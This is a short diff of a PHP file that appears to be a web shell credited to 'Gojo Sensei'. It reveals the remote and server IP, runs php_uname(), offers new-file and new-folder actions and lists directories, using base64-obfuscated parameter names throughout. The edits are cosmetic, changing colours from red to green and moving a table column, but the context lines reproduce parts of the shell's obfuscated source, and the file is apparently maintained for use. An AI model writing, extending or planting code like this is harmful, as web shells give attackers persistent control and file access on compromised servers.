@@ -382,7 +382,7 @@ button, input:hover {
         color: red;
     }
     50% {
-        color: yellow;
+        color: green;
     }
     100% {
         color: red;
@@ -406,9 +406,9 @@ button, input:hover {
 </head>
 <body>
 <div class="table-responsive text-light" style="text-align: left;padding: 4px;border: 2px solid #4200ac;border-radius:5px;">
-        <li>Your IP : <span style="color: red;"><?php echo $_SERVER[base64_decode('UkVNT1RFX0FERFI=')]; ?></span></li>
-        <li>Server IP : <span style="color: red;"><?php echo $_SERVER[base64_decode('U0VSVkVSX05BTUU=')]; ?></span></li>
-        <li>Server : <span style="color: red;"><?php echo php_uname(); ?></span></li>
+        <li>Your IP : <span style="color: green;"><?php echo $_SERVER[base64_decode('UkVNT1RFX0FERFI=')]; ?></span></li>
+        <li>Server IP : <span style="color: green;"><?php echo $_SERVER[base64_decode('U0VSVkVSX05BTUU=')]; ?></span></li>
+        <li>Server : <span style="color: green;"><?php echo php_uname(); ?></span></li>
         <li>Made By : <span class="kedip">Gojo Sensei</span></li>
         <li><a href="?p=<?= ss($Jd) . base64_decode('JmE9') . Ss(base64_decode('bmV3RmlsZQ==')) ?>" class="ohct kedip-border">+ File</a> | <a href="?p=<?= Ss($Jd) . base64_decode('JmE9') . sS(base64_decode('bmV3RGly')) ?>" class="ohct kedip-border">+ Folder</a></li>
         <li>
@@ -659,9 +659,9 @@ Un:
 <thead class="text-light">
 <tr>
 <th style="width: 45%;">Name</th>
-<th style="width: 13%;">Size</th>
 <th style="width: 13%;">Permission</th>
 <th colspan="3">Action</th>
+<th style="width: 13%;">Size</th>
 </tr>
 </thead>
 <tbody class="text-light"> <?php $G3 = $c8[5]($G3($Jd), [base64_decode('Lg=='), base64_decode('Li4=')]);
